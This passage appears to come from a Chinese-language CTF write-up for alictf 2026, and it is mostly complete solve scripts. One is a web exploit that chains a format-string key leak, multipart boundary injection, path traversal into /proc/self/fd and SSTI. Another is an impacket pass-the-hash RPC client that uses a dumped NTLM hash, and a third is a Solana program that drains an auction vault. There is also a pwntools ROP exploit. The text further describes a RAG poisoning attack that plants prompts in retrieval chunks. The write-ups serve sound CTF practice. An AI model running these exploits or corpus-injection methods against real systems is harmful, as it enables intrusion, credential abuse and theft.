    print("[*] Stage 1: Leaking API_KEY via Format String & Boundary Injection...")
    
    # Payload to leak the API_KEY variable from app's global scope
    # index is the view function name, which is 'action' or 'heartbeat' in this context
    payload_str = "{0.view_functions[index].__globals__[API_KEY]}"
    
    MY_BOUNDARY = "AaB03x"
    # We inject a fake multipart body inside the 'text' field to override the 'action' part
    inner_payload = (
        f"{payload_str}\r\n"
        f"--{MY_BOUNDARY}\r\n"
        'Content-Disposition: form-data; name="action"; filename="action.json"\r\n\r\n'
        '{"type": "debug"}\r\n'
        f"--{MY_BOUNDARY}--\r\n"
    )
    
    data = {
        "client": "content-type", # Header Injection: Control Content-Type
        "token": f"multipart/form-data; boundary={MY_BOUNDARY}", # Set our custom boundary
        "text": inner_payload
    }
    
    try:
        r = requests.post(f"{TARGET_URL}/heartbeat", data=data)
        if r.status_code == 200:
            # The API_KEY is a 64-char hex string (os.urandom(32).hex())
            match = re.search(r"([a-f0-9]{64})", r.text)
            if match:
                api_key = match.group(1)
                print(f"[+] Found API_KEY: {api_key}")
                return api_key
    except Exception as e:
        print(f"[-] Error leaking API_KEY: {e}")
    return None

def find_flag_filename(api_key):
    print("[*] Stage 2: Finding Flag filename via LFI -> SSTI Race Condition...")
    
    ssti_payload = "{{ config.__class__.__init__.__globals__['os'].listdir('/') }}"
    stop_event = threading.Event()

    def spammer():
        while not stop_event.is_set():
            try:
                # Keep sending the SSTI payload to fill socket buffers
                requests.get(f"{TARGET_URL}/heartbeat", params={"text": ssti_payload}, timeout=1)
            except: pass

    # Start background spammers
    threads = []
    for _ in range(8):
        t = threading.Thread(target=spammer)
        t.daemon = True
        t.start()
        threads.append(t)

    headers = {"Authorization": api_key}
    flag_file = None

    print("[*] Hunting for payload in /proc/self/fd/...")
    start_time = time.time()
    while time.time() - start_time < 60: # 1 minute timeout
        for fd in range(4, 15):
            try:
                # LFI into the procfs FD to read our own incoming request and render it as a template
                r = requests.get(f"{TARGET_URL}/admin", headers=headers, params={"tmpl": f"../../../../proc/self/fd/{fd}"}, timeout=1)
                if r.status_code == 200 and "['app.py'" in r.text:
                    # Look for the random flag filename
                    match = re.search(r"flag-[a-f0-9]{32}\.txt", r.text)
                    if match:
                        flag_file = match.group(0)
                        print(f"[+] Found flag file: {flag_file}")
                        stop_event.set()
                        return flag_file
            except: pass
        time.sleep(0.1)
    
    stop_event.set()
    return None

def read_flag(api_key, filename):
    print(f"[*] Stage 3: Reading {filename}...")
    headers = {"Authorization": api_key}
    try:
        # Simple LFI to read the flag
        r = requests.get(f"{TARGET_URL}/admin", headers=headers, params={"tmpl": f"../../../../{filename}"})
        if r.status_code == 200:
            print(f"\n[!!!] FLAG: {r.text.strip()}")
            return True
    except Exception as e:
        print(f"[-] Error: {e}")
    return False

if __name__ == "__main__":
    key = leak_api_key()
    if key:
        flag_file = find_flag_filename(key)
        if flag_file:
            read_flag(key, flag_file)
        else:
            print("[-] Failed to find flag filename. The race might be tough.")
    else:
        print("[-] Failed to leak API_KEY.")
```

flag

```
alictf{301e7a69-1262-4955-abe7-c8a120bd2093}
```

## Backup Exec

Re + Web

题目说明了攻击路径+flag路径，任务就是复盘+读取 `C:\Users\Administrator\Desktop\flag.txt`

非常善良的题目 甚至给了pdb 直接狠狠拖入IDA

用 IDA-NO-MCP 导出一下让AI分析

```Markdown
逆向 RPC 分析过程

  1. 快速确认是 RPC 服务

  - 在 imports 里看到 RPCRT4.dll，大量 RpcServer* / NdrServerCall* 函数。
  - 在 strings 里能搜到 ncacn_ip_tcp、RpcServerRegisterIf2 等关键字。
    → 确认为 RPC over TCP。

  2. 定位启动函数与端口

  - 在 IDA 里找 RpcServerUseProtseqEpW 调用点，对应函数名 StartRPCServer。
  - 函数里写死端口列表：69128, 62831, 67540, 60325, 63588，按顺序尝试，成功即监听。
  - 输出日志里打印 [Server] Using port %d，用于验证逻辑。

  3. 认证/授权逻辑

  - RpcServerRegisterIf2(..., AuthorizationFunc) 表示注册了授权回调。
  - AuthorizationFunc → IsClientInBackupAdminGroup。
  - 在 IsClientInBackupAdminGroup 里看到 ConvertStringSidToSidW("S-1-5-21-...-1624")
    → 组 SID 被硬编码（必须是该组成员）。
  - 还会 RpcImpersonateClient + OpenThreadToken + TokenGroups + EqualSid 做组验证。

  4. RPC 通信加密强制

  - CheckClientSecurityLevel 调用 RpcBindingInqAuthClientW，判断 authLevel >= 6
    也就是 RPC_C_AUTHN_LEVEL_PKT_PRIVACY。
    → 必须开启签名+加密。

  5. 用 PDB 还原接口结构

  - 用 llvm-pdbutil dump --globals 找到：
      - FileTransfer___RpcServerInterface
      - FileTransfer_v1_0_DispatchTable
      - FileTransfer_ServerRoutineTable
  - 通过 PDB 给出的地址，去 .rdata 里解析 _RPC_SERVER_INTERFACE 结构。
    解析方式：

    file_offset = section_file_offset + (VA - image_base - section_VA)
  - 从 _RPC_SERVER_INTERFACE 解析到接口 UUID：
    62e00289-44bd-497b-b85f-bc340fbcc2b0 版本 1.0

  6. 还原 opnum -> 函数映射

  - FileTransfer_ServerRoutineTable 是函数指针表。
  - 读到的顺序即为 opnum：
    0. OpenRemoteFile
      1. ReadFileData
      2. CloseFileHandle
      3. GetFileInfo
      4. ListDirectory
      5. ShutdownServer

  7. 解析 MIDL 参数/返回结构

  - PDB 中还有 FileTransfer__MIDL_ProcFormatString 和 FileTransfer_FormatStringOffsetTable。
  - 通过偏移表（0x0, 0x3c, 0x84, 0xa8, 0xde, 0x120）定位每个 op 的 NDR 格式。
  - 结合返回包实际长度，确认 OpenRemoteFile 的 out 参数是按值返回而不是指针。
    返回结构实际布局：

    [20 bytes ctx_handle]
    [4 bytes padding]
    [8 bytes fileSize]
    [4 bytes error]
    [1 byte return]

  8. XOR 加密逻辑

  - ReadFileData 中明确调用 XOREncryptDecrypt。
  - PDB 可定位 XOR_KEY 全局变量地址，从 .rdata 直接取 16 字节密钥：
    2a7fc3915e348b19d267f428ab76439d

  ———

  总结要点（RPC 逆向得到的核心结论）

  - 协议：ncacn_ip_tcp
  - 端口优先级：69128 → 62831 → 67540 → 60325 → 63588
  - 接口 UUID：62e00289-44bd-497b-b85f-bc340fbcc2b0 v1.0
  - 必须 PKT_PRIVACY 认证
  - 组成员 SID 必须为 ...-1624
  - opnum 映射固定 0~5
  - ReadFileData 返回数据需要 XOR 解密
```

整理一下得到的信息

```Plain
RPC 服务
协议：ncacn_ip_tcp
端口选择顺序：
    69128 → 62831 → 67540 → 60325 → 63588
接口 UUID：
    62e00289-44bd-497b-b85f-bc340fbcc2b0 v1.0
调用必须：
    PKT_PRIVACY（RPC_AUTHN_LEVEL_PKT_PRIVACY）
    组成员校验：硬编码 SID
    S-1-5-21-3223156632-3195994233-1317593892-1624
RPC 方法（opnum）
    OpenRemoteFile
    ReadFileData
    CloseFileHandle
    GetFileInfo
    ListDirectory
    ShutdownServer
加密
  ReadFileData 会对文件内容 XOR 加密：
  XOR Key => 2a7fc3915e348b19d267f428ab76439d
```

根据题目中的 `攻击者曾在系统上创建并配置了一个恶意 FTP 服务`，试一下 发现可以匿名登录 anonymous

![img](/img/2026-alictf/23.png)

然后在 `microsoft `目录下发现 `results.txt`，内容是 mimikatz dcsync /all 输出，包含大量 NTLM 哈希

```Plain
SAM Username         : Server Backup Operators
Object Security ID   : S-1-5-21-3223156632-3195994233-1317593892-1624
Object Relative ID   : 1624
```

找到 `RPC` 要求的 SID 组

理论上可能是要用查询下 `Server Backup Operators` 组成员吧

但是我环境好像有问题 就把Username提出来猜了几个，发现 `svc_dbbackup` 是对的

```Python
from impacket.dcerpc.v5 import transport, rpcrt
import struct

TARGET="116.62.114.4"
PORT=62831
DOMAIN="corp.local"
USER="svc_dbbackup"
NTHASH="eb2c652c8e8bfeed348d66ffa98be0d1"

KEY = bytes.fromhex('2a7fc3915e348b19d267f428ab76439d')

def xor_dec(data):
    return bytes(b ^ KEY[i % 16] for i, b in enumerate(data))

def ndr_wstring_ref(s):
    w = s.encode("utf-16-le") + b"\x00\x00"
    n = len(w)//2
    stub = struct.pack("<III", n, 0, n) + w
    if len(stub) % 4:
        stub += b"\x00"*(4-len(stub)%4)
    return stub

def open_file(dce, path):
    dce.call(0, ndr_wstring_ref(path))
    resp = dce.recv()

    ctx = resp[:20]  # context handle
    # align to 8
    fsize = struct.unpack_from("<Q", resp, 24)[0]
    err   = struct.unpack_from("<I", resp, 32)[0]
    ret   = resp[36] if len(resp) > 36 else None
    return ctx, fsize, err, ret

def read_file(dce, ctx, offset, size):
    stub = ctx + struct.pack("<II", offset, size)
    dce.call(1, stub)
    resp = dce.recv()

    # 尝试按「无指针 + conformant array」解析
    off = 0
    maxc, offc, act = struct.unpack_from("<III", resp, off); off += 12
    buf = resp[off:off+act]; off += act
    if off % 4:
        off += (4 - off % 4)

    bytes_read = struct.unpack_from("<I", resp, off)[0]; off += 4
    err = struct.unpack_from("<I", resp, off)[0]; off += 4
    ret = resp[off] if off < len(resp) else None
    return buf, bytes_read, err, ret, resp

def main():
    t = transport.DCERPCTransportFactory(f"ncacn_ip_tcp:{TARGET}[{PORT}]")
    t.set_credentials(USER, '', DOMAIN, lmhash='', nthash=NTHASH)
    dce = t.get_dce_rpc()
    dce.set_auth_type(rpcrt.RPC_C_AUTHN_WINNT)
    dce.set_auth_level(rpcrt.RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
    dce.connect()
    dce.bind(b'\x89\x02\xe0\x62\xbd\x44\x7b\x49\xb8\x5f\xbc\x34\x0f\xbc\xc2\xb0\x01\x00\x00\x00')

    ctx, fsize, err, ret = open_file(dce, r"C:\\Users\\Administrator\\Desktop\\flag.txt")
    print("Open:", "fsize=", fsize, "err=", err, "ret=", ret)

    if err != 0 or ret == 0:
        print("Open failed")
        return

    data = b""
    offset = 0
    toread = min(0x400, fsize)

    buf, n, err, ret, raw = read_file(dce, ctx, offset, toread)
    print("Read:", "bytes=", n, "err=", err, "ret=", ret)
    if n == 0:
        print("raw resp:", raw.hex())
        return

    data += buf[:n]
    print(xor_dec(data).decode(errors='ignore'))

if __name__ == "__main__":
    main()
```

# Misc

## RAG投毒挑战

本质上是基于RAG的间接提示注入攻击

题目给出了对应的RAG数据库数据文本，而靶机固定量两个问题，RAG会基于数据库里的数据做向量检索，然后返回对应的问题答案

所以我们可以通过修改对应的数据文本去引导RAG检索我们构造的恶意提示词，然后去执行一些操作

下载原始语料后直接上传 

![img](/img/2026-alictf/24.png)

测试后知道第一个问题的答案是李善德购买的宅子位于长安城南边的归义坊内。，去掉修饰语其实就是归义坊，通过VSCode搜索发现是在chunk_002.txt得到的这个答案。

![img](/img/2026-alictf/25.png)

试着在原文的归义坊附近添加内容来输出flag

![img](/img/2026-alictf/26.png)

上传后得到flag

![img](/img/2026-alictf/27.png)

## Auction

题目实现的是一个拍卖

拍卖参数 为起拍价：1 SOL，Deposit：0.2 SOL ，Buy Now：10 SOL，但是最开始我们只有0.1SOL，状态未清理导致的状态混淆 ：BidderState PDA的地址由 [b"bidder", auction_key, bidder_key] 派生。Auction PDA 的地址由 [b"auction", user_key, auction_id] 派生。如果我们创建一个拍卖（ID 1338），结束后将其关闭，然后 重新创建 同一个 ID 的拍卖， Auction 账户地址和对应的 BidderState 地址是完全相同的。合约在关闭拍卖时， 没有清除 BidderState 中的数据。

利用“低门槛进场，高门槛退场”的差异，凭空套取 Vault 中的资金。

我们写攻击代码lib.rs

```YAML
use anchor_lang::prelude::*;
use anchor_lang::system_program;

declare_id!("4FYNmWbFutX4fPV9edZCJg6vNnZGva56WpKCPWWMkpuj");

#[program]
pub mod solve {
    use super::*;

    pub fn initialize(ctx: Context<Initialize>) -> Result<()> {
        msg!("Exploit starting...");
 
        let transfer_ctx = CpiContext::new(
            ctx.accounts.system_program.to_account_info(),
            system_program::Transfer {
                from: ctx.accounts.user.to_account_info(),
                to: ctx.accounts.pda_bidder.to_account_info(),
            },
        );
        system_program::transfer(transfer_ctx, 10_000_000)?;
        msg!("Funded PDA");

        phase_1(&ctx)?;
        phase_2(&ctx)?;
        phase_3(&ctx)?;

        Ok(())
    }
}

fn phase_1(ctx: &Context<Initialize>) -> Result<()> {
    let now = Clock::get()?.unix_timestamp;
    let end_time_1 = now + 1000; 
    let deadline_1 = end_time_1 + 60 * 60 * 24 * 8; 

    {
        let cpi_ctx = CpiContext::new(
            ctx.accounts.challenge.to_account_info(),
            challenge::cpi::accounts::CreateAuction {
                auctioneer: ctx.accounts.user.to_account_info(),
                auction: ctx.accounts.auction.to_account_info(),
                system_program: ctx.accounts.system_program.to_account_info(),
            }
        );
        challenge::cpi::create_auction(cpi_ctx, 1338, "Prime".to_string(), 100, 10, 1, end_time_1, deadline_1)?;
    }

    {
        let cpi_ctx = CpiContext::new(
            ctx.accounts.challenge.to_account_info(),
            challenge::cpi::accounts::PlaceBid {
                bidder: ctx.accounts.user.to_account_info(),
                auction: ctx.accounts.auction.to_account_info(),
                vault: ctx.accounts.vault.to_account_info(),
                bidder_state: ctx.accounts.bidder_state_user.to_account_info(),
                system_program: ctx.accounts.system_program.to_account_info(),
            }
        );
        challenge::cpi::place_bid(cpi_ctx, 10)?;
    }

    {
        let seeds = &[b"helper".as_ref(), &[ctx.bumps.pda_bidder]];
        let signer = &[&seeds[..]];
        let cpi_ctx = CpiContext::new_with_signer(
            ctx.accounts.challenge.to_account_info(),
            challenge::cpi::accounts::PlaceBid {
                bidder: ctx.accounts.pda_bidder.to_account_info(),
                auction: ctx.accounts.auction.to_account_info(),
                vault: ctx.accounts.vault.to_account_info(),
                bidder_state: ctx.accounts.bidder_state_pda.to_account_info(),
                system_program: ctx.accounts.system_program.to_account_info(),
            },
            signer
        );
        challenge::cpi::place_bid(cpi_ctx, 11)?;
    }

    {
        let cpi_ctx = CpiContext::new(
            ctx.accounts.challenge.to_account_info(),
            challenge::cpi::accounts::PlaceBid {
                bidder: ctx.accounts.user.to_account_info(),
                auction: ctx.accounts.auction.to_account_info(),
                vault: ctx.accounts.vault.to_account_info(),
                bidder_state: ctx.accounts.bidder_state_user.to_account_info(),
                system_program: ctx.accounts.system_program.to_account_info(),
            }
        );
        challenge::cpi::place_bid(cpi_ctx, 100)?;
    }

    {
        let seeds = &[b"helper".as_ref(), &[ctx.bumps.pda_bidder]];
        let signer = &[&seeds[..]];
        let cpi_ctx = CpiContext::new_with_signer(
            ctx.accounts.challenge.to_account_info(),
            challenge::cpi::accounts::ClaimRefund {
                bidder: ctx.accounts.pda_bidder.to_account_info(),
                auction: ctx.accounts.auction.to_account_info(),
                bidder_state: ctx.accounts.bidder_state_pda.to_account_info(),
                vault: ctx.accounts.vault.to_account_info(),
                system_program: ctx.accounts.system_program.to_account_info(),
            },
            signer
        );
        challenge::cpi::claim_refund(cpi_ctx)?;
    }

    {
        let cpi_ctx = CpiContext::new(
            ctx.accounts.challenge.to_account_info(),
            challenge::cpi::accounts::ClaimWinner {
                winner: ctx.accounts.user.to_account_info(),
                auction: ctx.accounts.auction.to_account_info(),
                bidder_state: ctx.accounts.bidder_state_user.to_account_info(),
                auctioneer: ctx.accounts.user.to_account_info(),
                vault: ctx.accounts.vault.to_account_info(),
                system_program: ctx.accounts.system_program.to_account_info(),
            }
        );
        challenge::cpi::claim_winner(cpi_ctx)?;
    }

    {
        let cpi_ctx = CpiContext::new(
            ctx.accounts.challenge.to_account_info(),
            challenge::cpi::accounts::CloseAuction {
                auctioneer: ctx.accounts.user.to_account_info(),
                auction: ctx.accounts.auction.to_account_info(),
            }
        );
        challenge::cpi::close_auction(cpi_ctx)?;
    }
    msg!("Phase 1 Done");
    Ok(())
}

fn phase_2(ctx: &Context<Initialize>) -> Result<()> {
    let now = Clock::get()?.unix_timestamp;
    let end_time_1 = now + 1000; 
    let deadline_1 = end_time_1 + 60 * 60 * 24 * 8; 

    let start_high = 100_000_000_000u64; 
    let buy_now_high = 200_000_000_000u64; 
    let increment_high = 1_000_000_000u64; 

    {
        let cpi_ctx = CpiContext::new(
            ctx.accounts.challenge.to_account_info(),
            challenge::cpi::accounts::CreateAuction {
                auctioneer: ctx.accounts.user.to_account_info(),
                auction: ctx.accounts.auction.to_account_info(),
                system_program: ctx.accounts.system_program.to_account_info(),
            }
        );
        challenge::cpi::create_auction(cpi_ctx, 1338, "Drain".to_string(), buy_now_high, start_high, increment_high, end_time_1, deadline_1)?;
    }

    {
        let cpi_ctx = CpiContext::new(
            ctx.accounts.challenge.to_account_info(),
            challenge::cpi::accounts::PlaceBid {
                bidder: ctx.accounts.user.to_account_info(),
                auction: ctx.accounts.auction.to_account_info(),
                vault: ctx.accounts.vault.to_account_info(),
                bidder_state: ctx.accounts.bidder_state_user.to_account_info(),
                system_program: ctx.accounts.system_program.to_account_info(),
            }
        );
        challenge::cpi::place_bid(cpi_ctx, start_high)?;
    }

    {
        let seeds = &[b"helper".as_ref(), &[ctx.bumps.pda_bidder]];
        let signer = &[&seeds[..]];
        let cpi_ctx = CpiContext::new_with_signer(
            ctx.accounts.challenge.to_account_info(),
            challenge::cpi::accounts::PlaceBid {
                bidder: ctx.accounts.pda_bidder.to_account_info(),
                auction: ctx.accounts.auction.to_account_info(),
                vault: ctx.accounts.vault.to_account_info(),
                bidder_state: ctx.accounts.bidder_state_pda.to_account_info(),
                system_program: ctx.accounts.system_program.to_account_info(),
            },
            signer
        );
        challenge::cpi::place_bid(cpi_ctx, buy_now_high)?;
    }

    {
        let cpi_ctx = CpiContext::new(
            ctx.accounts.challenge.to_account_info(),
            challenge::cpi::accounts::ClaimRefund {
                bidder: ctx.accounts.user.to_account_info(),
                auction: ctx.accounts.auction.to_account_info(),
                bidder_state: ctx.accounts.bidder_state_user.to_account_info(),
                vault: ctx.accounts.vault.to_account_info(),
                system_program: ctx.accounts.system_program.to_account_info(),
            }
        );
        challenge::cpi::claim_refund(cpi_ctx)?;
    }
    msg!("Phase 2 Done");
    Ok(())
}

fn phase_3(ctx: &Context<Initialize>) -> Result<()> {
    let buy_now_admin = 10_000_000_000u64; 

    {
        let cpi_ctx = CpiContext::new(
            ctx.accounts.challenge.to_account_info(),
            challenge::cpi::accounts::PlaceBid {
                bidder: ctx.accounts.user.to_account_info(),
                auction: ctx.accounts.auction_admin.to_account_info(),
                vault: ctx.accounts.vault.to_account_info(),
                bidder_state: ctx.accounts.bidder_state_admin.to_account_info(),
                system_program: ctx.accounts.system_program.to_account_info(),
            }
        );
        challenge::cpi::place_bid(cpi_ctx, buy_now_admin)?;
    }

    {
        let cpi_ctx = CpiContext::new(
            ctx.accounts.challenge.to_account_info(),
            challenge::cpi::accounts::ClaimWinner {
                winner: ctx.accounts.user.to_account_info(),
                auction: ctx.accounts.auction_admin.to_account_info(),
                bidder_state: ctx.accounts.bidder_state_admin.to_account_info(),
                auctioneer: ctx.accounts.admin.to_account_info(),
                vault: ctx.accounts.vault.to_account_info(),
                system_program: ctx.accounts.system_program.to_account_info(),
            }
        );
        challenge::cpi::claim_winner(cpi_ctx)?;
    }
    msg!("Phase 3 Done");
    Ok(())
}

#[derive(Accounts)]
pub struct Initialize<'info> {
    #[account(mut)]
    pub user: Signer<'info>,

    #[account(
        mut, 
        seeds = [b"helper"], 
        bump
    )]
    pub pda_bidder: AccountInfo<'info>,
    
    pub challenge: Program<'info, challenge::program::Challenge>,
    
    #[account(mut)]
    pub auction: AccountInfo<'info>, 
    
    #[account(mut)]
    pub auction_admin: AccountInfo<'info>, 
    
    #[account(mut)]
    pub admin: AccountInfo<'info>,

    #[account(mut)]
    pub bidder_state_user: AccountInfo<'info>, 

    #[account(mut)]
    pub bidder_state_pda: AccountInfo<'info>, 

    #[account(mut)]
    pub bidder_state_admin: AccountInfo<'info>,
    
    #[account(mut)]
    pub vault: AccountInfo<'info>,
    
    pub system_program: Program<'info, System>,
}
```

创建一个自定义拍卖（ID 1338），设置极低的起拍价（0 SOL），此时保证金为 0。玩家参与竞拍。由于保证金为 0，玩家无需支付 SOL，但合约将玩家的 deposit_paid 设为 true 。利用辅助账户（PDA）出价更高并结束该拍卖，或者直接关闭拍卖，保留玩家的 BidderState 状态。

重建 同一个拍卖（ID 1338），但这次设置极高的参数（如起拍价 100 SOL -> 保证金 20 SOL）。玩家再次竞拍。合约检查发现 deposit_paid 已经是 true，因此 跳过 了 20 SOL 的转账检查。利用辅助账户（PDA）出以 10 SOL赢得拍卖，使玩家成为输家。玩家调用 claim_refund 。合约读取当前拍卖的保证金设置（20 SOL），将这笔钱从 Vault 转给玩家。玩家凭空获得了 20 SOL。

此时玩家余额已超过 0.2 SOL。直接参与管理员的拍卖（ID 1），支付保证金。以10 SOL直接赢得拍卖。调用 claim_winner 获取 Flag。

最后修改main.rs获得flag

```Rust
use anchor_lang::{system_program, InstructionData, ToAccountMetas};
use solana_program::pubkey::Pubkey;
use std::net::TcpStream;
use std::{error::Error, fs, io::prelude::*, io::BufReader, str::FromStr};

fn get_line<R: Read>(reader: &mut BufReader<R>) -> Result<String, Box<dyn Error>> {
    let mut line = String::new();
    reader.read_line(&mut line)?;
    let ret = line
        .split(':')
        .nth(1)
        .ok_or("invalid input")?
        .trim()
        .to_string();
    Ok(ret)
}

fn main() -> Result<(), Box<dyn Error>> {
    let mut stream = TcpStream::connect("223.6.249.127:14317")?;
    let mut reader = BufReader::new(stream.try_clone().unwrap());

    let mut line = String::new();

    // Check deploy first, then release
    let so_path_deploy = "./solve/target/deploy/solve.so";
    let so_path_release = "./solve/target/release/solve.so";
    
    let so_data = if fs::metadata(so_path_deploy).is_ok() {
        fs::read(so_path_deploy)?
    } else {
        fs::read(so_path_release)?
    };

    reader.read_line(&mut line)?;
    writeln!(stream, "{}", solve::ID)?;
    reader.read_line(&mut line)?;
    writeln!(stream, "{}", so_data.len())?;
    stream.write_all(&so_data)?;

    let chall = Pubkey::from_str(&get_line(&mut reader)?)?;
    let solve = Pubkey::from_str(&get_line(&mut reader)?)?;
    let admin = Pubkey::from_str(&get_line(&mut reader)?)?;
    let user = Pubkey::from_str(&get_line(&mut reader)?)?;
    reader.read_line(&mut line)?;

    println!("");
    println!("chall      : {}", chall);
    println!("solve      : {}", solve);
    println!("admin      : {}", admin);
    println!("user       : {}", user);
    println!("");

    // Derive PDAs
    let auction_id = 1338u64;
    let auction_admin_id = 1u64;
    
    let (pda_bidder, _) = Pubkey::find_program_address(&[b"helper"], &solve);

    let (auction, _) = Pubkey::find_program_address(
        &[b"auction", user.as_ref(), &auction_id.to_le_bytes()],
        &chall,
    );
    let (auction_admin, _) = Pubkey::find_program_address(
        &[b"auction", admin.as_ref(), &auction_admin_id.to_le_bytes()],
        &chall,
    );
    let (vault, _) = Pubkey::find_program_address(
        &[b"vault"],
        &chall,
    );
    let (bidder_state_user, _) = Pubkey::find_program_address(
        &[b"bidder", auction.as_ref(), user.as_ref()],
        &chall,
    );
    let (bidder_state_pda, _) = Pubkey::find_program_address(
        &[b"bidder", auction.as_ref(), pda_bidder.as_ref()],
        &chall,
    );
    let (bidder_state_admin, _) = Pubkey::find_program_address(
        &[b"bidder", auction_admin.as_ref(), user.as_ref()],
        &chall,
    );

    println!("pda_bidder  : {}", pda_bidder);
    println!("auction     : {}", auction);
    println!("auction_admin: {}", auction_admin);
    println!("vault       : {}", vault);
    println!("bidder_state_user: {}", bidder_state_user);
    println!("bidder_state_pda : {}", bidder_state_pda);
    println!("bidder_state_admin: {}", bidder_state_admin);
    println!("");

    {
        let ix = solve::instruction::Initialize {};
        let data = ix.data();
        let ix_accounts = solve::accounts::Initialize {
            user,
            pda_bidder,
            challenge: chall,
            auction,
            auction_admin,
            admin,
            bidder_state_user,
            bidder_state_pda,
            bidder_state_admin,
            vault,
            system_program: system_program::ID,
        };

        let metas = ix_accounts.to_account_metas(None);

        reader.read_line(&mut line)?;
        writeln!(stream, "{}", metas.len())?;
        for meta in metas {
            let mut meta_str = String::new();
            meta_str.push('m');
            if meta.is_writable {
                meta_str.push('w');
            }
            if meta.is_signer {
                meta_str.push('s');
            }
            meta_str.push(' ');
            meta_str.push_str(&meta.pubkey.to_string());
            writeln!(stream, "{}", meta_str)?;
            stream.flush()?;
        }

        reader.read_line(&mut line)?;
        writeln!(stream, "{}", data.len())?;
        stream.write_all(&data)?;

        stream.flush()?;
    }

    line.clear();
    while reader.read_line(&mut line)? != 0 {
        print!("{}", line);
        line.clear();
    }

    Ok(())
}
```

# Pwn

## SyncVault

```Python
from pwn import *

s    = lambda   x : io.send(x)
sl   = lambda   x : io.sendline(x)
r    = lambda x   : io.recv(x)
ru   = lambda x   : io.recvuntil(x)
rl   = lambda     : io.recvline()
itr  = lambda     : io.interactive()
uu32 = lambda x   : u32(x.ljust(4,b'\x00'))
uu64 = lambda x   : u64(x.ljust(8,b'\x00'))
ls   = lambda x   : log.success(x)
lss  = lambda x   : ls('\033[1;31;40m%s -> 0x%x \033[0m' % (x, eval(x)))

attack = '127.0.0.1 10000'.replace(' ',':')
attack = '223.6.249.127:56463'.replace(' ',':')
binary = './pwn'

context(arch='amd64', log_level = 'debug',terminal='tmux splitw -h -l 170'.split(' '))
#io = process(binary)
gs = '''
'''
#pay = flat({
#},filler=b'\x00')
#gdb.attach(io,gdbscript=gs)
def set_size(iot,size):
    pay  = 'SET '
    pay += str(size)
    iot.sendline(pay)

def set_head(iot,n):
    pay  = 'SETHEAD '
    pay += str(n)
    iot.sendline(pay)

def set_body(iot,n):
    pay  = 'SETBODY '
    pay += str(n)
    iot.sendline(pay)

def set_sync(iot,n):
    pay  = 'SETSYNC '
    pay += str(n)
    iot.sendline(pay)

def echo(iot,data):
    pay  = 'ECHO'
    iot.sendline(pay)
    iot.sendline(data)

def snaphot(iot):
    pay = 'SNAPSHOT'
    iot.sendline(pay)

def diag(iot):
    pay = 'DIAG'
    iot.sendline(pay)

def sync(iot):
    pay = 'SYNC'
    iot.sendline(pay)

def backup(iot):
    pay = 'QUEUE BACKUP'
    iot.sendline(pay)

def export(iot):
    pay = 'QUEUE EXPORT'
    iot.sendline(pay)

def health(iot):
    pay = 'QUEUE HEALTH'
    iot.sendline(pay)

def show_tasks(iot):
    pay = 'SHOW TASKS'
    iot.sendline(pay)

def show_logs(iot):
    pay = 'SHOW LOGS'
    iot.sendline(pay)

def tick(iot):
    pay = 'TICK'
    iot.sendline(pay)

def get_tid(iot, offset):
    set_sync(iot, 56)
    sync(iot)
    pay = b'A' * 0x30 + p64(offset)
    iot.send(pay)
    iot.recvuntil('TID=')
    tid = int(iot.recvline())
    print(hex(tid))
    return tid

p1 = remote(*attack.split(':')) # body
p2 = remote(*attack.split(':')) # head
p3 = remote(*attack.split(':'))
p4 = remote(*attack.split(':'))

# set head = 0x40000000
tid = get_tid(p1,0x10)
set_body(p1,tid)
p1.close()

# set body = 0x40000000
tid = get_tid(p2,0x18)
set_head(p2,tid)
p2.close()

#pause()

# set size = 0x40000000
tid = get_tid(p4,0x20)
set_size(p4,tid)
p4.close()

p5 = remote(*attack.split(':'))
snaphot(p3)

leak = p3.recv(0xec0)
print(hexdump(leak))
canary = uu64(leak[0x408:0x408+8])
libc_base = uu64(leak[0xeb8:0xeb8+8]) - 0x60d88
lss('canary')
lss('libc_base')
p3.close()

libc = ELF('./libc.so.6')
libc.address = libc_base
libc_rop = ROP(libc)
rax = libc_rop.find_gadget(['pop rax','ret'])[0]
rdi = libc_rop.find_gadget(['pop rdi','ret'])[0]
rsi = libc_rop.find_gadget(['pop rsi','ret'])[0]
rdx = libc_base + 0x00000000000b503c # pop rdx ; xor eax, eax ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
syscall = libc_rop.find_gadget(['syscall','ret'])[0]
mov_ = libc_base + 0x000000000013b991 # mov qword ptr [rsi], rdi ; ret
flag = libc.sym['_IO_2_1_stdin_']
rop  = b''
rop += p64(rdi)
rop += b'/flag'.ljust(0x8,b'\x00')
rop += p64(rsi)
rop += p64(flag)
rop += p64(mov_)
m = 5
rop += p64(rdx) + p64(0)*m + p64(rax) + p64(2) + p64(rdi) + p64(flag) + p64(rsi) + p64(0) +  p64(syscall)
rop += p64(rdi) + p64(7) + p64(rsi) + p64(flag) + p64(rdx) + p64(0x100)*m + p64(libc.sym['read'])
rop += p64(rdi) + p64(4) + p64(rsi) + p64(flag) + p64(rdx) + p64(0x100)*m + p64(libc.sym['write'])

pay  = 0x400 * b'A'
pay += p64(canary) * 7
pay += rop

flag = remote(*attack.split(':'))
echo(p5,pay) # overflow
p5.close()
#p5.shutdown('send')
flag.interactive()
```

# Reverse

## pixelflow

用Il2CppDumperr给GameAssembly.dll恢复符号，函数主逻辑在状态机Controller__Check_d__18__MoveNext

```Rust
void Controller__Check_d__18__MoveNext(Controller__Check_d__18_o *this, const MethodInfo *method)
{
if ( !byte_180F4C9B1 )
  {
    sub_180157800(
      &Method_System_Runtime_CompilerServices_AsyncVoidMethodBuilder_AwaitUnsafeOnCompleted_TaskAwaiter_byte_____Controller__Check_d__18___,
      method);
    sub_180157800(
      &Method_System_Runtime_CompilerServices_AsyncVoidMethodBuilder_AwaitUnsafeOnCompleted_TaskAwaiter__Controller__Check_d__18___,
      v3);
    sub_180157800(&Method_Controller__Check_b__18_0__, v4);
    sub_180157800(&Method_Controller__Check_b__18_1__, v5);
    sub_180157800(&Method_Controller__Check_b__18_2__, v6);
    sub_180157800(&Method_Controller__Check_b__18_3__, v7);
    sub_180157800(&System_Func_Task__TypeInfo, v8);
    sub_180157800(&System_Func_Task_byte_____TypeInfo, v9);
    sub_180157800(&System_Func_byte____Task__TypeInfo, v10);
    sub_180157800(&int___TypeInfo, v11);
    sub_180157800(&Method_System_Runtime_CompilerServices_TaskAwaiter_byte____GetResult__, v12);
    sub_180157800(&Method_System_Runtime_CompilerServices_TaskAwaiter_byte____get_IsCompleted__, v13);
